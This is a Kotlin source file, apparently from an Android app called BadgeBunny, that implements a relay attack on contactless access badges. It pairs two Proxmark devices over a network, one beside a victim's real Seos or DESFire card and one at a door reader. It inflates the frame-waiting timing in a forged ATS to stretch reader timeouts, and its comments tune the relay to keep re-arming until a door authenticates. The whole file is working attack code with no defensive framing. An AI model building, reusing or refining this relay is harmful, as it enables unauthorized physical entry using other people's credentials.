package com.badgebunny.relay

import com.badgebunny.log.BbLog
import com.badgebunny.net.RelayLink

enum class Role { READER, EMULATOR }

/**
 * Wires the Proxmark (hf_cardhopper) to the network relay for a chosen role.
 *
 *  READER   : Proxmark next to the real card. Sends "READ", captures UID+ATS, ships them to the
 *             peer, then relays each APDU it receives to the real card and returns the response.
 *  EMULATOR : Proxmark at the target reader. Sends "CARD" + tagType + [FWI,SFGI] (forges the ATS
 *             timing locally), receives UID+ATS from the peer, then feeds the reader's APDUs across
 *             the link and replies with what comes back.
 *
 * Mirrors the reference hopper.py host flow: a naive symmetric pump on both sides. The RATS and
 * anticollision asymmetry is handled entirely in the hf_cardhopper firmware (the card side answers
 * RATS locally with its cooked ATS and forwards it without waiting; a late reply is drained), so the
 * host must NOT special-case RATS/DESELECT — doing so desyncs the card and breaks the Seos exchange.
 */
class RelayEngine(
    private val pm3: com.badgebunny.transport.Pm3Link,
    private val net: RelayLink,
    private val role: Role,
    private val tagType: Int, // emulator only: SEOS=12, DESFire EV1=3
    private val fwi: Int,     // emulator only: 0..14
    private val sfgi: Int,    // emulator only: 0..14
    private val log: (String) -> Unit,
    private val onCount: (Int) -> Unit
) {
    @Volatile private var running = false
    private var count = 0
    private val T = "BB.RE"

    companion object {
        // The firmware answers "\xffERR" (magicERR) when the real card gives no valid response to a
        // relayed frame. A single one is normal — the reader-side card errors on the duplicate RATS
        // the emulator forwards. But a *run* of them means the ISO-DEP session collapsed (the link
        // outran the card's ~155 ms frame-waiting time), after which the door reader just retransmits
        // forever (the "FF 00 12" ↔ "\xffERR" loop seen in the logs). Detect that and abort so the
        // outer loop re-arms cleanly instead of pumping garbage.
        private val ERR_MAGIC = byteArrayOf(0xFF.toByte(), 0x45, 0x52, 0x52) // "\xffERR"
        private const val COLLAPSE_STREAK = 3   // recycle fast on a stalled auth — the Seos relay is
                                                // inherently retry-until-success, so quick re-arms win

        // ISO14443-4 RATS command byte (E0). The door reader sends RATS to (re)activate the card;
        // our become_card firmware answers it locally with the cooked ATS.
        private const val RATS_CMD = 0xE0.toByte()
    }

    fun stop() { running = false; BbLog.d(T, "stop() called") }

    private fun clamp(v: Int) = if (v > 14) 14 else if (v < 0) 0 else v

    @Throws(Exception::class)
    fun run() {
        running = true
        BbLog.d(T, "run() role=$role")
        try {
            when (role) {
                Role.READER -> runReader()
                Role.EMULATOR -> runEmulator()
            }
        } finally {
            BbLog.d(T, "run() finished, sending ERR to peer")
            net.sendErr()
        }
    }

    // READER: PM3 next to the real card. Naive symmetric pump — the firmware's select_card()
    // blocks until a card is present and emits UID then ATS; after that every frame from the
    // peer is relayed to the card verbatim (RATS/anticollision asymmetry is handled entirely in
    // firmware). Mirrors hopper.py run_reader().
    private fun runReader() {
        log("READER: sending READ — present the card to the Proxmark…")
        pm3.sendFrame("READ".toByteArray(Charsets.US_ASCII))
        val uid = pm3.recvFrame()
        val ats = pm3.recvFrame()
        log("READER: UID = ${uid.hex()}")
        log("READER: ATS = ${ats.hex()}")
        net.sendMsg(RelayLink.UID, uid)
        net.sendMsg(RelayLink.ATS, ats)
        log("READER: relaying APDUs to the card…")
        var errStreak = 0
        while (running) {
            val m = net.recv()
            if (m.type == RelayLink.ERR) { log("peer signalled end"); break }
            pm3.sendFrame(m.payload)
            val resp = pm3.recvFrame()
            net.sendMsg(RelayLink.APDU, resp)
            count++; onCount(count)
            log("→ card ${m.payload.hex()}")
            log("← card ${resp.hex()}")
            if (resp.contentEquals(ERR_MAGIC)) {
                if (++errStreak >= COLLAPSE_STREAK) {
                    log("session collapsed: card returned ERR ${errStreak}× in a row — link too slow / card dropped the session. Aborting to re-arm.")
                    break
                }
            } else errStreak = 0
        }
    }

    // EMULATOR: PM3 at the target reader. Sends CARD + tagType + [FWI,SFGI] + UID + ATS (firmware
    // cooks the ATS with the inflated FWI), then a naive symmetric pump. The loop is offset by one
    // exactly like hopper.py run_card(): the firmware relays the first reader command before we
    // ever wait on the peer, so pm3.recv → peer.send leads each iteration.
    private fun runEmulator() {
        BbLog.d(T, "EMULATOR: sendFrame(CARD)")
        pm3.sendFrame("CARD".toByteArray(Charsets.US_ASCII))
        pm3.sendFrame(byteArrayOf(tagType.toByte()))
        pm3.sendFrame(byteArrayOf(clamp(fwi).toByte(), clamp(sfgi).toByte()))
        log("EMULATOR: waiting for UID/ATS from peer…")
        val uidMsg = net.recv(); if (uidMsg.type == RelayLink.ERR) { log("peer signalled end"); return }
        pm3.sendFrame(uidMsg.payload)
        log("EMULATOR: UID = ${uidMsg.payload.hex()}")
        val atsMsg = net.recv(); if (atsMsg.type == RelayLink.ERR) { log("peer signalled end"); return }
        pm3.sendFrame(atsMsg.payload)
        log("EMULATOR: ATS = ${atsMsg.payload.hex()}  (FWI=${clamp(fwi)} SFGI=${clamp(sfgi)} tagType=$tagType)")
        log("EMULATOR: present the Proxmark to the reader…")
        var errStreak = 0
        while (running) {
            val apdu = pm3.recvFrame()
            net.sendMsg(RelayLink.APDU, apdu)
            val resp = net.recv()
            if (resp.type == RelayLink.ERR) { log("peer signalled end"); break }

            // RATS asymmetry (matches hf_cardhopper become_card's no_reply path). The reader-side
            // real card was already fully activated — RATS + ATS — by become_reader's select_card(),
            // so it can't answer a *second* RATS and the reader side returns \xffERR for it. Our own
            // firmware has meanwhile ALREADY answered this door reader's RATS locally with the cooked
            // ATS. So we must consume the peer's reply to keep the pump aligned, but must NOT push it
            // back to the PM3: that extra USB round-trip makes the firmware miss the reader's next
            // command and collapses the session (the failure seen in every naive-pump log). Drop it.
            if (apdu.isNotEmpty() && apdu[0] == RATS_CMD) {
                count++; onCount(count)
                log("← reader ${apdu.hex()} (RATS — firmware answered locally; peer reply dropped)")
                errStreak = 0
                continue
            }

            pm3.sendFrame(resp.payload)
            count++; onCount(count)
            log("← reader ${apdu.hex()}")
            log("→ reader ${resp.payload.hex()}")
            if (resp.payload.contentEquals(ERR_MAGIC)) {
                if (++errStreak >= COLLAPSE_STREAK) {
                    log("session collapsed: peer relayed ERR ${errStreak}× in a row — link too slow / card dropped the session. Aborting to re-arm.")
                    break
                }
            } else errStreak = 0
        }
    }
}

fun ByteArray.hex(): String = if (isEmpty()) "(empty)" else joinToString(" ") { "%02X".format(it) }
